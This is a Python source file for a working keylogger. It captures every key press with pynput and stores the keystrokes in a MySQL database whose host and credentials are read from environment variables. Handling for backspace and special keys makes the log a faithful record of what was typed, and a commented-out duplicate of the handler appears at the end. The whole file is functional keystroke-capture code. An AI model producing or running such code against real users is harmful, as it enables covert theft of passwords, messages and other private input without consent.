
# Import required modules
from pynput import keyboard
import mysql.connector
from dotenv import load_dotenv
import os

# Load environment variables from .env file
load_dotenv()

# Get credentials from environment
db_host = os.getenv('DB_HOST')
db_user = os.getenv('DB_USER')
db_password = os.getenv('DB_PASSWORD')
db_name = os.getenv('DB_NAME')

# Connect to MySQL database
conn = mysql.connector.connect(
    host=db_host,
    user=db_user,
    password=db_password,
    database=db_name
)
cursor = conn.cursor()

# Check if 'logs' table exists; if missing, read and execute SQL commands from 'keylogger.sql' to set up the database/table
cursor.execute("SHOW TABLES LIKE 'logs'")
result = cursor.fetchone()
if not result:
    # Read and execute SQL setup file
    with open('keylogger.sql', 'r') as sql_file:
        sql_script = sql_file.read()
        try:
            for result in cursor.execute(sql_script, multi=True):
                pass  # Each result is a MySQLCursor object
        except Exception as e:
            print(f"SQL error: {e}")
    conn.commit()

# Function to handle key events

# Handles a key event and logs it to the database
def keyInput(key):
    # Print the key for debugging
    print(str(key))
    # Try to log the key event
    try:
        # Check if the key is a character
        if hasattr(key, 'char') and key.char is not None:
            # Log the character key
            cursor.execute("INSERT INTO logs (`key`) VALUES (%s)", (key.char,))
        # Check if the key is a space
        elif key == keyboard.Key.space:
            # Log a space
            cursor.execute("INSERT INTO logs (`key`) VALUES (%s)", (' ',))
        # Check if the key is backspace
        elif key == keyboard.Key.backspace:
            # Find the last log entry
            cursor.execute("SELECT id FROM logs ORDER BY id DESC LIMIT 1")
            last = cursor.fetchone()
            # If there is a last entry, delete it
            if last:
                cursor.execute("DELETE FROM logs WHERE id = %s", (last[0],))
        # For other keys, log their name in brackets
        else:
            # Log the special key name
            cursor.execute("INSERT INTO logs (`key`) VALUES (%s)", (f'[{key.name}]',))
        # Commit the transaction
        conn.commit()
    # If an error occurs, print it
    except Exception as e:
        print(f"Unable to receive key: {e}")

# Main entry point: start keylogger listener

# If this script is run directly, start the keylogger listener
if __name__ == "__main__":
    # Create a keyboard listener for key events
    listener = keyboard.Listener(on_press=keyInput)
    # Start the listener
    listener.start()
    # Keep the program running
    input()


# Handles a key event and logs it to the database (duplicate, can be removed)
# def keyInput(key):
#     print(str(key))
#     try:
#         if hasattr(key, 'char') and key.char is not None:
#             cursor.execute("INSERT INTO logs (`key`) VALUES (%s)", (key.char,))
#         elif key == keyboard.Key.space:
#             cursor.execute("INSERT INTO logs (`key`) VALUES (%s)", (' ',))
#         elif key == keyboard.Key.backspace:
#             cursor.execute("SELECT id FROM logs ORDER BY id DESC LIMIT 1")
#             last = cursor.fetchone()
#             if last:
#                 cursor.execute("DELETE FROM logs WHERE id = %s", (last[0],))
#         else:
#             cursor.execute("INSERT INTO logs (`key`) VALUES (%s)", (f'[{key.name}]',))
#         conn.commit()
#     except Exception as e:
#         print(f"Unable to receive key: {e}")

# If this script is run directly, start the keylogger listener (duplicate, can be removed)
# if __name__ == "__main__":
#     listener = keyboard.Listener(on_press=keyInput)
#     listener.start()
#     input()